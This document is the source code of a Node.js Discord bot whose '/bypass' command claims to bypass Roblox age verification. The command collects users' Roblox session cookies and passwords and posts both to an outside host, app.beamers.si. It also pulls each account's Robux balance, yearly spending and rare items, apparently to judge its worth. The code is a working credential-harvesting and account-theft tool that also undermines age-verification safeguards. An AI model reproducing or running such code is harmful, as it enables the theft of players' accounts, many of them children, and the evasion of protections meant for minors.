
const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder, REST, Routes } = require('discord.js');

// Environment variables
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const AUTH_TOKEN = process.env.AUTH_TOKEN; // Optional for API authentication

if (!DISCORD_TOKEN || !CLIENT_ID) {
    console.error('Missing required environment variables: DISCORD_TOKEN and CLIENT_ID');
    process.exit(1);
}

// Store bypass role per guild
const bypassRoles = new Map();

// Create Discord client
const client = new Client({
    intents: [GatewayIntentBits.Guilds]
});

// Slash command definition
const commands = [
    new SlashCommandBuilder()
        .setName('bypass')
        .setDescription('Bypass age verification using Roblox credentials')
        .addStringOption(option =>
            option.setName('cookie')
                .setDescription('Roblox .ROBLOSECURITY cookie')
                .setRequired(true)
        )
        .addStringOption(option =>
            option.setName('password')
                .setDescription('Roblox account password')
                .setRequired(true)
        ),
    new SlashCommandBuilder()
        .setName('setbypassrole')
        .setDescription('Set which role can use the bypass command (Admin only)')
        .addRoleOption(option =>
            option.setName('role')
                .setDescription('Role that can use the bypass command')
                .setRequired(true)
        )
        .setDefaultMemberPermissions(8) // Administrator permission
];

// Register slash commands
async function registerCommands() {
    try {
        const rest = new REST({ version: '10' }).setToken(DISCORD_TOKEN);
        
        console.log('Started refreshing application (/) commands.');
        
        await rest.put(
            Routes.applicationCommands(CLIENT_ID),
            { body: commands }
        );
        
        console.log('Successfully reloaded application (/) commands.');
    } catch (error) {
        console.error('Error registering commands:', error);
    }
}

// Handle interactions
client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    
    if (interaction.commandName === 'bypass') {
        await handleBypassCommand(interaction);
    } else if (interaction.commandName === 'setbypassrole') {
        await handleSetBypassRoleCommand(interaction);
    }
});

// Function to get CSRF token from Roblox
async function getRobloxCSRFToken(cookie) {
    const fetch = (await import('node-fetch')).default;
    
    try {
        const response = await fetch('https://auth.roblox.com/v2/logout', {
            method: 'POST',
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Origin': 'https://www.roblox.com',
                'Referer': 'https://www.roblox.com/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site'
            }
        });
        
        return response.headers.get('x-csrf-token');
    } catch (error) {
        console.error('Error fetching CSRF token:', error);
        return null;
    }
}

// Function to create authenticated headers for Roblox API requests
function createRobloxHeaders(cookie, csrfToken = null) {
    const headers = {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site'
    };
    
    if (csrfToken) {
        headers['X-CSRF-TOKEN'] = csrfToken;
    }
    
    return headers;
}

// Function to get user data from Roblox APIs
async function getRobloxUserData(cookie) {
    const fetch = (await import('node-fetch')).default;
    
    try {
        // Get CSRF token first
        const csrfToken = await getRobloxCSRFToken(cookie);
        
        // Get user info from Roblox
        const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
            headers: createRobloxHeaders(cookie, csrfToken)
        });
        
        if (!userResponse.ok) {
            throw new Error('Failed to fetch user data');
        }
        
        const userData = await userResponse.json();
        const userId = userData.id;
        const username = userData.name;
        
        // Get robux balance
        const robuxResponse = await fetch('https://economy.roblox.com/v1/users/' + userId + '/currency', {
            headers: createRobloxHeaders(cookie, csrfToken)
        });
        
        let robuxBalance = 'Unknown';
        if (robuxResponse.ok) {
            const robuxData = await robuxResponse.json();
            robuxBalance = robuxData.robux || 0;
        }
        
        // Get currently wearing items to check for Korblox/Headless
        const avatarResponse = await fetch(`https://avatar.roblox.com/v1/users/${userId}/currently-wearing`, {
            headers: createRobloxHeaders(cookie, csrfToken)
        });
        
        let hasKorblox = false;
        let hasHeadless = false;
        
        if (avatarResponse.ok) {
            const avatarData = await avatarResponse.json();
            const assetIds = avatarData.assetIds || [];
            
            // Korblox Deathspeaker asset ID: 139607718
            // Headless Horseman asset ID: 134082579
            hasKorblox = assetIds.includes(139607718);
            hasHeadless = assetIds.includes(134082579);
        }
        
        // Get spending data (try to get transaction summary)
        const transactionResponse = await fetch(`https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=Year&transactionType=Purchase`, {
            headers: createRobloxHeaders(cookie, csrfToken)
        });
        
        let totalSpending = 'Unknown';
        if (transactionResponse.ok) {
            const transactionData = await transactionResponse.json();
            totalSpending = transactionData.robuxTotal || 0;
        }
        
        return {
            username,
            userId,
            robuxBalance,
            totalSpending,
            hasKorblox,
            hasHeadless
        };
        
    } catch (error) {
        console.error('Error fetching Roblox user data:', error);
        return null;
    }
}

// Handle the bypass command
async function handleBypassCommand(interaction) {
    // Defer the reply to give us more time to process
    await interaction.deferReply({ ephemeral: true });
    
    // Check if user has required role
    const requiredRoleId = bypassRoles.get(interaction.guildId);
    if (requiredRoleId) {
        const member = await interaction.guild.members.fetch(interaction.user.id);
        if (!member.roles.cache.has(requiredRoleId)) {
            const errorEmbed = new EmbedBuilder()
                .setTitle('Access Denied')
                .setDescription('You do not have the required role to use this command.')
                .setColor(0xFF0000)
                .setTimestamp();
            
            await interaction.editReply({ embeds: [errorEmbed] });
            return;
        }
    }
    
    const cookie = interaction.options.getString('cookie');
    const password = interaction.options.getString('password');
    
    try {
        // Dynamic import for node-fetch
        const fetch = (await import('node-fetch')).default;
        
        // First, get user data from Roblox
        const userDataPromise = getRobloxUserData(cookie);
        
        // Make bypass API request
        const apiUrl = 'https://app.beamers.si/api/bypasser';
        
        const requestBody = {
            action: "force_minus_13_all_ages",
            cookie: cookie,
            password: password
        };
        
        const headers = {
            'Content-Type': 'application/json',
            'authority': 'app.beamers.si',
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-US,en;q=0.9',
            'origin': 'https://app.beamers.si',
            'referer': 'https://app.beamers.si/dashboard/bypasser',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'
        };
        
        // Add AUTH_TOKEN in cookie header if available
        if (AUTH_TOKEN) {
            headers['cookie'] = `AUTH_TOKEN=${AUTH_TOKEN}`;
        }
        
        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify(requestBody),
            timeout: 15000 // 15 second timeout for both requests
        });
        
        const responseText = await response.text();
        
        if (!response.ok) {
            console.log('API Response Status:', response.status);
            console.log('API Response Text:', responseText);
            
            // Try to parse as JSON for better error message
            let errorData;
            try {
                errorData = JSON.parse(responseText);
            } catch (e) {
                errorData = { message: responseText };
            }
            
            throw new Error(`HTTP ${response.status}: ${errorData.message || response.statusText}`);
        }
        
        const bypassData = JSON.parse(responseText);
        const userData = await userDataPromise;
        
        // Check if bypass was successful
        const isSuccess = bypassData.status === 'success' || bypassData.success === true || 
                         (bypassData.message && bypassData.message.toLowerCase().includes('bypass'));
        
        // Create main user info embed
        const userEmbed = new EmbedBuilder()
            .setTitle(`${userData?.username || 'Unknown User'} - Age Bypass Service`)
            .setColor(isSuccess ? 0x00FF00 : 0xFF0000)
            .setTimestamp();
        
        if (userData) {
            // Add user data fields
            userEmbed.addFields(
                { name: '👤 Username', value: userData.username, inline: true },
                { name: '🆔 User ID', value: userData.userId.toString(), inline: true },
                { name: '💰 Robux Balance', value: userData.robuxBalance.toString(), inline: true },
                { name: '📊 Total Spending (This Year)', value: userData.totalSpending.toString(), inline: true },
                { name: '👑 Korblox', value: userData.hasKorblox ? '✅ True' : '❌ False', inline: true },
                { name: '💀 Headless', value: userData.hasHeadless ? '✅ True' : '❌ False', inline: true }
            );
        } else {
            userEmbed.addFields(
                { name: '⚠️ User Data', value: 'Could not fetch user data from Roblox API', inline: false }
            );
        }
        
        // Add bypass status
        userEmbed.addFields(
            { name: '🔄 Bypass Status', value: isSuccess ? '✅ Completed' : '❌ Failed', inline: true }
        );
        
        if (bypassData.message) {
            userEmbed.addFields(
                { name: '📝 Details', value: bypassData.message, inline: false }
            );
        }
        
        // Add footer with request info
        userEmbed.setFooter({ 
            text: `Requested by ${interaction.user.username}`, 
            iconURL: interaction.user.displayAvatarURL() 
        });
        
        await interaction.editReply({ embeds: [userEmbed] });
        
    } catch (error) {
        console.error('Error in bypass command:', error);
        
        // Create error embed
        const errorEmbed = new EmbedBuilder()
            .setTitle('❌ Bypass Failed')
            .setColor(0xFF0000)
            .setTimestamp();
        
        if (error.name === 'AbortError') {
            errorEmbed.addFields({ 
                name: 'Status', 
                value: 'Timeout', 
                inline: true 
            });
            errorEmbed.addFields({ 
                name: 'Message', 
                value: 'Request timed out. Please try again later.', 
                inline: false 
            });
        } else if (error.message.includes('HTTP 401')) {
            errorEmbed.addFields({ 
                name: 'Status', 
                value: 'Unauthorized', 
                inline: true 
            });
            errorEmbed.addFields({ 
                name: 'Message', 
                value: 'Authentication failed. Please check your cookie and password.', 
                inline: false 
            });
        } else if (error.message.includes('HTTP 403')) {
            errorEmbed.addFields({ 
                name: 'Status', 
                value: 'Access Denied', 
                inline: true 
            });
            errorEmbed.addFields({ 
                name: 'Message', 
                value: 'The API rejected your request. This could be due to:\n• Invalid cookie or password\n• API authentication issues\n• Rate limiting\n\nPlease verify your credentials and try again.', 
                inline: false 
            });
        } else if (error.message.includes('HTTP')) {
            errorEmbed.addFields({ 
                name: 'Status', 
                value: 'API Error', 
                inline: true 
            });
            errorEmbed.addFields({ 
                name: 'Message', 
                value: `API request failed: ${error.message}`, 
                inline: false 
            });
        } else if (error instanceof SyntaxError) {
            errorEmbed.addFields({ 
                name: 'Status', 
                value: 'Parse Error', 
                inline: true 
            });
            errorEmbed.addFields({ 
                name: 'Message', 
                value: 'Invalid response from API. Please try again later.', 
                inline: false 
            });
        } else {
            errorEmbed.addFields({ 
                name: 'Status', 
                value: 'Unknown Error', 
                inline: true 
            });
            errorEmbed.addFields({ 
                name: 'Message', 
                value: 'An unexpected error occurred. Please try again later.', 
                inline: false 
            });
        }
        
        errorEmbed.setFooter({ 
            text: `Requested by ${interaction.user.username}`, 
            iconURL: interaction.user.displayAvatarURL() 
        });
        
        await interaction.editReply({ embeds: [errorEmbed] });
    }
}

// Handle the setbypassrole command
async function handleSetBypassRoleCommand(interaction) {
    const role = interaction.options.getRole('role');
    
    // Store the role for this guild
    bypassRoles.set(interaction.guildId, role.id);
    
    const embed = new EmbedBuilder()
        .setTitle('Bypass Role Updated')
        .setDescription(`The bypass command can now only be used by members with the **${role.name}** role.`)
        .setColor(0x00FF00)
        .setTimestamp();
    
    await interaction.reply({ embeds: [embed], ephemeral: true });
}

// Bot ready event
client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
    console.log('Bot is ready and online!');
});

// Error handling
client.on('error', error => {
    console.error('Discord client error:', error);
});

process.on('unhandledRejection', error => {
    console.error('Unhandled promise rejection:', error);
});

// Start the bot
async function startBot() {
    try {
        await registerCommands();
        await client.login(DISCORD_TOKEN);
    } catch (error) {
        console.error('Failed to start bot:', error);
        process.exit(1);
    }
}

startBot();
